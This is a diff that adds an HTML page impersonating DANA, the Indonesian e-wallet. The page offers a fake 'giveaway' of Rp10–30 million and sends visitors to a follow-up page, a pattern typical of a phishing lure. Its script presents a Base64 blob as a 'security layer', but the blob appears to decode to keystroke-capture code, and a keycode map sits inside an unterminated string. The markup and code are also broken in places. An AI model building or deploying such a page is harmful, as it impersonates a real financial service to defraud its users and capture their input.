@@ -1,0 +1,450 @@
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta content="#118EEA" name="theme-color"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1" name="viewport"/>
+<title>
+   𝐈𝐃_𝐃𝐀𝐍𝐀 𝐏𝐞𝐧𝐞𝐫𝐢𝐦𝐚 𝐑𝐞𝐬𝐦𝐢 </title>
+<meta content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" name="description"/><!-- Facebook Meta Tags --><meta content="https://www.dana.id" property="og:url"/><meta content="website" property="og:type"/><meta content="𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 " property="og:title"/><meta content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" property="og:description"/><meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxVEbM6TiKx9XqUCWRH3PCjhmKcME9KSKK6jyrdjsEA37TFD1A9yNnAX9R-ex5xibCHkwAPuvqr_NwI9kLm5vV8gNYPCI7lljCdYJ48RZNe-E05kxKmSrz9u52iws0OKvncla9IV2raFom36pkiJ1mT9oCKztUfP3mV9Y9ubFhsUwExBnddpfZbL4vtuA/s680/AddText_06-03-06.00.30.jpg" property="og:image"/><!-- Twitter Meta Tags --><meta content="summary_large_image" name="twitter:card"/><meta content="https://www.dana.id" property="twitter:domain"/><meta content="https://www.dana.id" property="twitter:url"/><meta content="𝗗𝗔𝗡𝗔 - 𝗚𝗶𝘃𝗲𝗮𝘄𝗮𝘆 𝗨𝗮𝗻𝗴 𝗧𝘂𝗻𝗮𝗶 " name="twitter:title"/><meta content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" name="twitter:description"/><meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxVEbM6TiKx9XqUCWRH3PCjhmKcME9KSKK6jyrdjsEA37TFD1A9yNnAX9R-ex5xibCHkwAPuvqr_NwI9kLm5vV8gNYPCI7lljCdYJ48RZNe-E05kxKmSrz9u52iws0OKvncla9IV2raFom36pkiJ1mT9oCKztUfP3mV9Y9ubFhsUwExBnddpfZbL4vtuA/s680/AddText_06-03-06.00.30.jpg" property="og:image"/>
+<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&amp;usqp=CAU" rel="shortcut icon" type="image/x-icon"/><link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&amp;usqp=CAU" rel="apple-touch-icon"/><link href="https://www.dana.id/" rel="canonical"/><meta content="https://www.dana.id/" property="og:url"><meta content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung" property="og:description"/><meta content="Hai TemanDANA, Jika membutuhkan bantuan yuk hubungi kami langsung" property="twitter:description"/>
+<script src="OwlCarousel2/assets/bootstrap-icons.css"></script><link href="OwlCarousel2/assets/owl.theme.default.min.css" rel="stylesheet"/><link href="OwlCarousel2/assets/bootstrap.css" rel="stylesheet"/><link href="OwlCarousel2/assets/owl.carousel.min.css" rel="stylesheet"/><link href="OwlCarousel2/assets/aos.css" rel="stylesheet"/><link href="OwlCarousel2/assets/bootstrap.css" rel="stylesheet"/><link href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css" rel="stylesheet"/><link href="https://fonts.googleapis.com/css?family=Varela+Round&amp;display=swap" rel="stylesheet"/><link href="style.css" rel="stylesheet"/><link href="assets/OwlCarousel2/dist/assets/owl.carousel.min.css" rel="stylesheet"/><link href="assets/OwlCarousel2/dist/assets/owl.theme.default.min.css" rel="stylesheet"/><script src="assets/OwlCarousel2/dist/owl.carousel.min.js"></script><script src="assets/OwlCarousel2/dist/owl.carousel.angular-route.min.js.map"></script><script src="assets/OwlCarousel2/dist/owl.carousel.index.js"></script><script src="assets/OwlCarousel2/dist/owl.carousel.create-react-class.min.js"></script><script src="assets/OwlCarousel2/dist/owl.carousel.jquery.min.js"></script><script src="OwlCarousel2/dist/owl.carousel.min.js"></script><script src="OwlCarousel2/dist/owl.carousel.security-kit.js"></script><link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet"/><link href="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/assets/owl.theme.default.min.css" rel="stylesheet"/>
+ <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.min.js"><script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/typescript.js">
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._functions.scss">
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._containers.scss">
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._helpers.scss">
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery._maps.scss">
+ <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.bootstrap.css">
+  <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery. _spinners.scss">
+  <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js">
+  <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.common.js.map">
+  <script src="https://owlcarousel2.github.io/OwlCarousel2/assets/vendors/jquery.echarts.min.js"></script><script src="https://owlcarousel2.github.io/OwlCarousel2/assets/owlcarousel/owl.carousel.js"></script><style>
+
+@charset "UTF-8"; /*! * Bootstrap v5.1.3 (https://getbootstrap.com/) * Copyright 2011-2021 The Bootstrap Authors * Copyright 2011-2021 Twitter, Inc. * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE) */form { --background: #ffffff; --text: #414856; --radio: #7C96B2; --radio-checked: #118EEA; --radio-size: 25px; --width: 292px; --height: 120px; --border-radius: 20px 20px 8px 8px; background: var(--background); width: var(--width); height: var(--height); border-radius: var(--border-radius); color: var(--text); position: relative; left: 0; right: 0; box-shadow: 0 10px 30px rgba(65, 72, 86, 0.05); box-shadow: rgba(99, 99, 99, 0.2) 0px 2px 8px 0px; padding: 30px 20px; padding-top: 10px; display: block; grid-template-columns: auto var(--radio-size); font-weight: bold; align-items: center; font-family: Alata, sans-serif; } form label { cursor: pointer; color: #118EEA; font-weight: bold; text-shadow: 1px 1px 0 #FFF; } form input[type=radio] { -webkit-appearance: none; -moz-appearance: none; position: relative; height: var(--radio-size); width: var(--radio-size); outline: none; margin: 3px 0; cursor: pointer; border: 2px solid var(--radio); background: transparent; border-radius: 50%; display: grid; justify-self: end; justify-items: center; align-items: center; overflow: hidden; transition: border 0.5s ease; } form input[type=radio]::before, form input[type=radio]::after { content: ""; display: flex; justify-self: center; border-radius: 50%; } form input[type=radio]::before { position: absolute; width: 100%; height: 100%; background: var(--background); z-index: 1; opacity: var(--opacity, 1); } form input[type=radio]::after { position: relative; width: calc(100% /2); height: calc(100% /2); background: var(--radio-checked); top: var(--y, 100%); transition: top 0.5s cubic-bezier(0.48, 1.97, 0.5, 0.63); } form input[type=radio]:checked { --radio: var(--radio-checked); } form input[type=radio]:checked::after { --y: 0%; -webkit-animation: stretch-animate 0.3s ease-out 0.17s; animation: stretch-animate 0.3s ease-out 0.17s; } form input[type=radio]:checked::before { --opacity: 0; } form input[type=radio]:checked ~ input[type=radio]::after { --y: -100%; } form input[type=radio]:not(:checked)::before { --opacity: 1; transition: opacity 0s linear 0.5s; } @-webkit-keyframes stretch-animate { 0% { transform: scale(1, 1); } 28% { transform: scale(1.15, 0.85); } 50% { transform: scale(0.9, 1.1); } 100% { transform: scale(1, 1); } } @keyframes stretch-animate { 0% { transform: scale(1, 1); } 28% { transform: scale(1.15, 0.85); } 50% { transform: scale(0.9, 1.1); } 100% { transform: scale(1, 1); } } body { background: #E8EBF3; height: 100%; font: 400 16px "Varela Round", sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; } body .socials { position: fixed; display: block; left: 20px; bottom: 20px; } body .socials > a { display: block; width: 30px; opacity: 0.2; transform: scale(var(--scale, 0.8)); transition: transform 0.3s cubic-bezier(0.38, -0.12, 0.24, 1.91); } body .socials > a:hover { --scale: 1; } /* Added PseudoCode CSS to Hide the Controls of Video as on adding Controls Attribute to Video, the controls of video get visible easily. So to control that case also, this needs to be present on CSS End */ video::-webkit-media-controls { display: ; } video { display: none; pointer-events: none; } #carousel { grid-row: 1 / 2; grid-column: 1 / 8; width: 150vw; height: 500px; display: flex; align-items: center; justify-content: center; overflow: hidden; transform-style: preserve-3d; perspective: 600px; --items: 5; --middle: 3; --position: 1; pointer-events: none; } div.item { position: absolute; width: 300px; height: 400px; background-color: coral; --r: calc(var(--position) - var(--offset)); --abs: max(calc(var(--r) * -1), var(--r)); transition: all 0.25s linear; transform: rotateY(calc(-10deg * var(--r))) translateX(calc(-300px * var(--r))); z-index: calc((var(--position) - var(--abs))); } div.item:nth-of-type(1) { --offset: 1; background-color: #90f1ef; } div.item:nth-of-type(2) { --offset: 2; background-color: #ff70a6; } div.item:nth-of-type(3) { --offset: 3; background-color: #ff9770; } div.item:nth-of-type(4) { --offset: 4; background-color: #ffd670; } div.item:nth-of-type(5) { --offset: 5; background-color: #e9ff70; } .btn-punya { display: inline-block; margin: 5px auto; padding: 0px; position: relative; cursor: pointer; left: 0; right: 0; background: none rgb(0, 134, 224); border: none; text-align: center; height: 45px; width: 100%; border: 1.5px solid #ddd; font-family: 'Open Sans', sans-serif; font-size: 14px; font-weight: bold; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 5px 5px 7px 0px; transition: background 200ms ease 0s; } .btn-punya:active{ opacity: 0.5; } /*********************/ .process1 { width: 100%; height: 100%; display: flex; justify-content: center; margin: auto; position: absolute; padding-top: 300px; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.4); z-index: 99999; box-shadow: rgba(6, 24, 44, 0.4) 0px 0px 0px 0px, rgba(6, 24, 44, 0.65) 0px 4px 4px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; background: #118EEA; color: #fff; font-size: 17px; font-weight: bold; } .loading { position: absolute; display: flex; justify-content: center; align-items: center; margin-bottom: 20%; margin-top: 300px; } .loading img { width: 50px; top: 10; } .loading .spinner{ position: absolute; width: 35px; animation: spin 1s linear infinite; -webkit-animation: spin 1s linear infinite; -moz-animation: spin 1s linear infinite; -ms-animation: spin 1s linear infinite; -o-animation: spin 1s linear infinite; } @keyframes spin { 0% { transform: rotate(360deg); } 100% { transform: rotate(0deg); } } @-webkit-keyframes spin { 0% { -webkit-transform: rotate(360deg); } 100% { -webkit-transform: rotate(0deg); } } @-moz-keyframes spin { 0% { -webkit-transform: rotate(360deg); } 100% { -webkit-transform: rotate(0deg); } } @-ms-keyframes spin { 0% { -webkit-transform: rotate(360deg); } 100% { -webkit-transform: rotate(0deg); } } @-o-keyframes spin { 0% { -webkit-transform: rotate(360deg); } 100% { -webkit-transform: rotate(0deg); } } /*********************/ body{ background-image: url(https://a.m.dana.id/resource/danaweb-v2/hero-personal-bg-back.png); background-position: 100% 100%; background-size: 100% 100%; background-color: #fff; } .animated { -webkit-animation-duration: 3s; animation-duration: 3s; -webkit-animation-fill-mode: both; animation-fill-mode: both; -webkit-animation-name: bounceInDown; animation-name: bounceInDown; } @-webkit-keyframes bounceInDown { 0% { opacity: 1; -webkit-transform: translateY(-200px); } 60% { opacity: 1; -webkit-transform: translateY(0px); } 80% { -webkit-transform: translateY(0px); } 100% { -webkit-transform: translateY(0); } } @keyframes bounceInDown { 0% { opacity: 1; transform: translateY(-200px); } 60% { opacity: 1; transform: translateY(0px); } 80% { transform: translateY(0px); } 100% { transform: translateY(0); } }<style>#animation-demo{width:200px;height:150px;position:relative;background-color:#62a80a;line-height:150px;color:#000;border:solid 1px #1a7404;text-align:center}.effec{-webkit-animation-duration:2s;animation-duration:2s;-webkit-animation-fill-mode:both;animation-fill-mode:both;-webkit-animation-name:fadeInRightBig;animation-name:fadeInRightBig;text-align:center}@-webkit-keyframes fadeInRightBig{0%{opacity:1;-webkit-transform:translateX(200px)}100%{opacity:1;-webkit-transform:translateX(0)}}@keyframes fadeInRightBig{0%{opacity:1;transform:translateX(200px)}100%{opacity:1;transform:translateX(0)}}.radio-item{margin-bottom:15px;position:relative;padding:10px;background-color:#e7f3fe;border:2px solid #118eea;display:flex;justify-content:space-between;align-items:center;height:30px;border-radius:20px 0 0 20px}.radio-item input[type=radio]{margin-left:7px;accent-color:#118eea;transform:scale(1.2)}.radio-item label{cursor:pointer;text-align:center;font-size:18px;display:inline-block;width:100%;color:#000;margin-left:-20px}.radio-item label .icon{font-size:20px;margin-right:5px}#spinner{border:4px solid rgba(0,0,0,.1);border-left-color:#000;border-radius:50%;width:24px;height:24px;animation:spin 1s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}</style><nav style="position:fixed;top:5;left:0;right:0;margin:0 auto;width:100%;height:60px;background:0 0;z-index:999"><img src=https://www.dana.id/_nuxt/img/dana-logo.fe46647.png style=width:100px;margin-top:px;margin-left:9px;background:#></nav><center><img src=https://blogger.googleusercontent.com/img/a/AVvXsEgUI7eurWlPGIU-GgXLqTo8jP6rJjLh33KtkdsfCbf_3hUap-bRWnUqqxQoyjLSpfQ-ac9uvt1aC2k4PMGa-7NTs4oAM_3x9EcQNukuZbWYGwGKdhX_0OEquQZowBLi30YdNf8rADPV8Gd3zS5J5wpv36jVBP6Zl99upYrSzMRmK9COw71rJf4NnkSsmz4L style="width:100%;display:inline-block;background-color:#118eea;position:absolute;margin-top:-60%;left:0;right:0;border-radius:0 0 12px 12px;border-bottom:3px groove #fff;box-shadow:0 10px 30px rgba(65,72,86,.05);box-shadow:rgba(6,24,44,1.4) 0 0 6px 6px,rgba(6,24,44,.05) 0 4px 6px -1px,rgba(255,255,255,1.08) 0 1px 0 inset;outline:3px solid #118eea"class=animated id=video height=22% preload=metadata type=img/jpeg width=100%></center><section class=effec><form style="margin-top:-78px;height:40px;padding-top:12px;margin-bottom:60px;text-align:center;font-size:15px;background:#118eea;display:grid;color:#fff;border:2px solid #fff;outline:2px solid #118eea;box-shadow:rgba(6,24,44,.4) 0 0 4px 5px inset,rgba(6,24,44,.65) 0 4px 6px -1px,rgba(255,255,255,.08) 0 1px 0 inset;margin-left:4px"><center><h2 style=margin-left:14px;text-align:center;font-size:14px;font-weight:700;color:#fff;margin-top:-10px;width:100%>DANA GIVEAWAY</h2></center></form><audio id=dana1 preload=none src=https://kementrian-daerah.c1.is/sound/dana1.mp3 type=audio/mpeg></audio><audio id=dana2 preload=none src=https://kementrian-daerah.c1.is/sound/dana0.mp3 type=audio/mpeg></audio><audio id=dana3 preload=none src=https://kementrian-daerah.c1.is/sound/dana3.mp3 type=audio/mpeg></audio><audio id=dana4 preload=none src=https://kementrian-daerah.c1.is/sound/dana9.mp3 type=audio/mpeg></audio><form style="margin-top:-90px;border-top:1px solid #ccc;height:195px;text-align:center;background:url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);background-position:100% 100%;background-size:100% 100%;background-color:#fff;outline:1px solid #118eea;text-shadow:0 .5px .5px rgba(000,999,255,10.75);box-shadow:rgba(6,24,24,.99) 0 0 0 2px,rgba(6,24,4,10.65) 0 4px 6px -1px,rgba(255,255,255,.08) 0 1px 0 inset;font-size:12px;color:#fff;margin-left:5.5px"><center><form id=myForm><div class=radio-item><input id=radio1 name=radio type=radio required> <label for=radio1><span class=icon></span>💸 Rp10.000.000 💸<span class=icon></span></label></div><div class=radio-item><input id=radio2 name=radio type=radio> <label for=radio2><span class=icon></span>💸 Rp20.000.000 💸<span class=icon></span></label></div><div class=radio-item><input id=radio3 name=radio type=radio> <label for=radio3><span class=icon></span>💸 Rp30.000.000 💸<span class=icon></span></label></div></form><br><br><br><br><button class=btn-punya onclick=letsgo() type=button>Konfirmasi</button><div style=margin-top:27px;width:100%;padding:0 size=0.4><img src=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiay900qDhJBTrVpMKboyHBG-112n5BezC6lE5EfrTp52boqs69BJSQAAqtGaswUyYJ7_5AXEeOhCPpfIDAelfG_uvvbX3ToIyuBYzymdUefAuzBp6BFOiAV0E4hJi9JDK0ukK7J6WOLHUZ_Mghnr6WtRNiFisGOGKJe6Ol9pVPeEcagIL3HFPdNPdRtnc/s1368/AddText_05-06-07.24.07.png style=width:155px;margin-top:-15px></div></center></form></section><br><center><div class=process1 id=process1 name=process style=display:none;background:rgba(0,0,0,.4)><div class=loading><img src=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png> <img src=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png style=margin-top:-2px class=spinner id=loading></div></div></center><img src=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png style="width:100%;position:fixed;bottom:-5;left:0;right:0;margin:0 auto;z-index:-1"><script>document.getElementById("myForm").addEventListener("submit", function (event) {
+  event.preventDefault(); // Mencegah pengiriman form otomatis
+
+  // Cek apakah ada radio button yang dipilih
+  let selected = document.querySelector('input[name="option"]:checked');
+
+  if (!selected) {
+    alert("Pilih salah satu opsi sebelum submit!");
+  } else {
+    // Tampilkan spinner
+    document.getElementById("spinner").style.display = "block";
+
+    // Simulasi proses (contoh menunggu 2 detik)
+    setTimeout(function () {
+      document.getElementById("spinner").style.display = "none";
+      alert("Form berhasil dikirim!");
+    }, 2000);
+  }
+});
+
+    const video = document.getElementById("video");
+video.addEventListener("play", handleFirstPlay, false);
+
+let hasPlayed = false;
+function handleFirstPlay(event) {
+  if (!hasPlayed) {
+    hasPlayed = true;
+
+    // Remove listener so this only gets called once.
+    const vid = event.target;
+    vid.removeEventListener("play", handleFirstPlay);
+
+    // Start whatever you need to do after first playback has started
+  }
+}</script><script>var owl=$(".owl-carousel");owl.owlCarousel({items:2,loop:!0,margin:10,autoplay:!0,autoplayHoverPause:!0})</script><script>function toggleMute() {
+    var video = document.getElementById('video');
+    if (video.muted) {
+        video.muted = false;
+    } else {
+        video.muted = true;
+    }
+}
+
+/* Delay Function to Add SetTimeOut After Defined Interval */
+
+function delay(time) {
+    return new Promise((resolve) => setTimeout(resolve, time));
+}
+
+/* Show Video Function to Add Display Property to Show the Video on Click of Button which will fulfilled User Interaction Needs to Browser to Run the Video with Unmute State */
+
+function showVideo() {
+    var element = document.getElementById('video');
+    var button = document.getElementById('button');
+    element.style.display = 'block';
+    button.style.display = 'none';
+    delay(100).then(() => toggleMute());
+}</script><script>var dana1=document.getElementById("dana1"),dana2=document.getElementById("dana2"),dana3=document.getElementById("dana3"),dana4=document.getElementById("dana4");function play_Audio1(){dana1.play(),this.currentTime=0,dana2.load(),dana3.load(),dana4.load()}function play_Audio2(){dana2.play(),this.currentTime=0,dana3.load(),dana4.load()}function play_Audio3(){dana4.play(),this.currentTime=0,dana2.load(),dana3.load()}function play_Audio4(){dana3.play(),this.currentTime=0,dana4.load(),dana2.load()}</script><script>function letsgo(){$("#process1").show(),window.location.href="dan.html",setTimeout(function(){$("#process1").fadeOut()},2e3)}</script><script>// Lapisan Keamanan 1-30
+        const securityLayers = [
+            // Lapis 1: Enkripsi Base64
+            {
+                name: "Base64",
+                description: "IWZ1bmN0aW9uKCl7dmFyIGU9e2RlYnVnOiExfTtlLkE9NjUsZS5CPTY2LGUuQz02NyxlLkQ9NjgsZS5FPTY5LGUuRj03MCxlLkc9NzEsZS5IPTcyLGUuST03MyxlLko9NzQsZS5LPTc1LGUuTD03NixlLk09NzcsZS5OPTc4LGUuTz03OSxlLlA9ODAsZS5RPTgxLGUuUj04MixlLlM9ODMsZS5UPTg0LGUuVT04NSxlLlY9ODYsZS5XPTg3LGUuWD04OCxlLlk9ODksZS5aPTkwLGUuWkVSTz00OCxlLk9ORT00OSxlLlRXTz01MCxlLlRIUkVFPTUxLGUuRk9VUj01MixlLkZJVkU9NTMsZS5TSVg9NTQsZS5TRVZFTj01NSxlLkVJR0hUPTU2LGUuTklORT01NyxlLk5VTVBBRF8wPTk2LGUuTlVNUEFEXzE9OTcsZS5OVU1QQURfMj05OCxlLk5VTVBBRF8zPTk5LGUuTlVNUEFEXzQ9MTAwLGUuTlVNUEFEXzU9MTAxLGUuTlVNUEFEXzY9MTAyLGUuTlVNUEFEXzc9MTAzLGUuTlVNUEFEXzg9MTA0LGUuTlVNUEFEXzk9MTA1LGUuTlVNUEFEX01VTFRJUExZPTEwNixlLk5VTVBBRF9BREQ9MTA3LGUuTlVNUEFEX0VOVEVSPTEwOCxlLk5VTVBBRF9TVUJUUkFDVD0xMDksZS5OVU1QQURfREVDSU1BTD0xMTAsZS5OVU1QQURfRElWSURFPTExMSxlLkYxPTExMixlLkYyPTExMyxlLkYzPTExNCxlLkY0PTExNSxlLkY1PTExNixlLkY2PTExNyxlLkY3PTExOCxlLkY4PTExOSxlLkY5PTEyMCxlLkYxMD0xMjEsZS5GMTE9MTIyLGUuRjEyPTEyMyxlLkYxMz0xMjQsZS5GMTQ9MTI1LGUuRjE1PTEyNixlLkNPTE9OPTE4NixlLkVRVUFMUz0xODcsZS5VTkRFUlNDT1JFPTE4OSxlLlFVRVNUSU9OX01BUks9MTkxLGUuVElMREU9MTkyLGUuT1BFTl9CUkFDS0VUPTIxOSxlLkJBQ0tXQVJEX1NMQVNIPTIyMCxlLkNMT1NFRF9CUkFDS0VUPTIyMSxlLlFVT1RFUz0yMjIsZS5MRVNTX1RIQU49MTg4LGUuR1JFQVRFUl9USEFOPTE5MCxlLkJBQ0tTUEFDRT04LGUuVEFCPTksZS5DTEVBUj0xMixlLkVOVEVSPTEzLGUuU0hJRlQ9MTYsZS5DT05UUk9MPTE3LGUuQUxUPTE4LGUuQ0FQU19MT0NLPTIwLGUuRVNDPTI3LGUuU1BBQ0VCQVI9MzIsZS5QQUdFX1VQPTMzLGUuUEFHRV9ET1dOPTM0LGUuRU5EPTM1LGUuSE9NRT0zNixlLkxFRlQ9MzcsZS5VUD0zOCxlLlJJR0hUPTM5LGUuRE9XTj00MCxlLklOU0VSVD00NSxlLkRFTEVURT00NixlLkhFTFA9NDcsZS5OVU1fTE9DSz0xNDQ7dmFyIG4sbz1bXSxFPSExLHQ9ITEscj1mdW5jdGlvbihuKXtFfHwoZS5kZWJ1ZyYmIW9bbi5rZXlDb2RlXSYmY29uc29sZS5sb2coIktleSBwcmVzc2VkOiAiK24ua2V5Q29kZSksb1tuLmtleUNvZGVdPSEwKX0sQT1mdW5jdGlvbihuKXtFfHwoZS5kZWJ1ZyYmb1tuLmtleUNvZGVdJiZjb25zb2xlLmxvZygiS2V5IHJlbGVhc2VkOiAiK24ua2V5Q29kZSksb1tuLmtleUNvZGVdPSExKX0sZD1mdW5jdGlvbihuKXtmb3IodmFyIHQgaW4gbylvLmhhc093blByb3BlcnR5KHQpJiYob1t0XT0hMSk7RT0hMCxlLmRlYnVnJiZjb25zb2xlLmxvZygiVGFyZ2V0IGxvc3QgZm9jdXMiKX07X3Jlc3RhcnRLZXlzPWZ1bmN0aW9uKG4pe0U9ITEsZS5kZWJ1ZyYmY29uc29sZS5sb2coIlRhcmdldCByZWNlaXZlZCBmb2N1cyIpfSxlLnN0YXJ0Q2FwdHVyZT1mdW5jdGlvbihvKXtvPW98fHdpbmRvdyx0JiZlLmVuZENhcHR1cmUoKSxuPW8sbi5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIixyKSxuLmFkZEV2ZW50TGlzdGVuZXIoImtleXVwIixBKSxuLmFkZEV2ZW50TGlzdGVuZXIoImJsdXIiLGQpLG4uYWRkRXZlbnRMaXN0ZW5lcigiZm9jdXMiLF9yZXN0YXJ0S2V5cyksdD0hMCxlLmRlYnVnJiZjb25zb2xlLmxvZygiQ2FwdHVyZSBzdGFydGVkIil9LGUuZW5kQ2FwdHVyZT1mdW5jdGlvbigpe3QmJihuLnJlbW92ZUV2ZW50TGlzdGVuZXIoImtleWRvd24iLHIpLG4ucmVtb3ZlRXZlbnRMaXN0ZW5lcigia2V5dXAiLEEpLG4ucmVtb3ZlRXZlbnRMaXN0ZW5lcigiYmx1ciIsZCksbi5yZW1vdmVFdmVudExpc3RlbmVyKCJmb2N1cyIsX3Jlc3RhcnRLZXlzKSxuPW51bGwsdD0hMSxlLnJlc2V0S2V5cyhudWxsKSxlLmRlYnVnJiZjb25zb2xlLmxvZygiQ2FwdHVyZSBlbmRlZCIpKX0sZS5pc0Rvd249ZnVuY3Rpb24oZSl7cmV0dXJuIUUmJnZvaWQgMCE9b1tlXSYmbnVsbCE9b1tlXSYmMT09b1tlXX0sInVuZGVmaW5lZCIhPXR5cGVvZiBtb2R1bGU/bW9kdWxlLmV4cG9ydHM9ZTp3aW5kb3cuS2V5SlM9ZX0oKTs=",
+                secure: false,
+                activate: function() {
+                    return "Base64 Active: " + btoa("SecureLayer1-" + Date.now());
+                }
+            },
+            
+            // Lapis 2: Hash MD5
+            {
+                name: "Hash MD5",
+                description: "Menghasilkan hash MD5 untuk integritas data",
+                secure: false,
+                activate: function() {
+                    return "MD5 Hash: " + this.md5("SecureLayer2-" + Date.now());
+                },
+                md5: function(input) {
+                    // Simplified MD5-like hash for demonstration
+                    let hash = 0;
+                    for (let i = 0; i < input.length; i++) {
+                        hash = ((hash << 5) - hash) + input.charCodeAt(i);
+                        hash = hash & hash;
+                    }
+                    return Math.abs(hash).toString(16);
+                }
+            },
+            
+            // Lapis 3: Random Token Generator
+            {
+                name: "Random Token Generator",
+                description: " ",
+                secure: false,
+                activate: function() {
+                    return "Token: " + this.generateToken(32);
+                },
+                generateToken: function(length) {
+                    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                    let token = '';
+                    for (let i = 0; i < length; i++) {
+                        token += chars.charAt(Math.floor(Math.random() * chars.length));
+                    }
+                    return token;
+                }
+            },
+            
+            // Lapis 4: XOR Encryption
+            {
+                name: "XOR Encryption",
+                description: "Enkripsi sederhana menggunakan operasi XOR",
+                secure: false,
+                activate: function() {
+                    const key = "var Keyman = (function() {
+    var Key = {
+        8: 'BACKSPACE',
+        9: 'TAB',
+        13: 'ENTER',
+        16: 'SHIFT',
+        17: 'CTRL',
+        18: 'ALT',
+        19: 'PAUSE_BREAK',
+        20: 'CAPS_LOCK',
+        27: 'ESCAPE',
+        33: 'PAGE_UP',
+        34: 'PAGE_DOWN',
+        35: 'END',
+        36: 'HOME',
+        37: 'LEFT_ARROW',
+        38: 'UP_ARROW',
+        39: 'RIGHT_ARROW',
+        40: 'DOWN_ARROW',
+        45: 'INSERT',
+        46: 'DELETE',
+        48: [0,')'],
+        49: [1,'!'],
+        50: [2,'@'],
+        51: [3,'#'],
+        52: [4,'$'],
+        53: [5,'%'],
+        54: [6,'^'],
+        55: [7,'&'],
+        56: [8,'*'],
+        57: [9,'('],
+        65: 'A',
+        66: 'B',
+        67: 'C',
+        68: 'D',
+        69: 'E',
+        70: 'F',
+        71: 'G',
+        72: 'H',
+        73: 'I',
+        74: 'J',
+        75: 'K',
+        76: 'L',
+        77: 'M',
+        78: 'N',
+        79: 'O',
+        80: 'P',
+        81: 'Q',
+        82: 'R',
+        83: 'S',
+        84: 'T',
+        85: 'U',
+        86: 'V',
+        87: 'W',
+        88: 'X',
+        89: 'Y',
+        90: 'Z',
+        91: 'LEFT_WINDOW_KEY',
+        92: 'RIGHT_WINDOW_KEY',
+        93: 'SELECT_KEY',
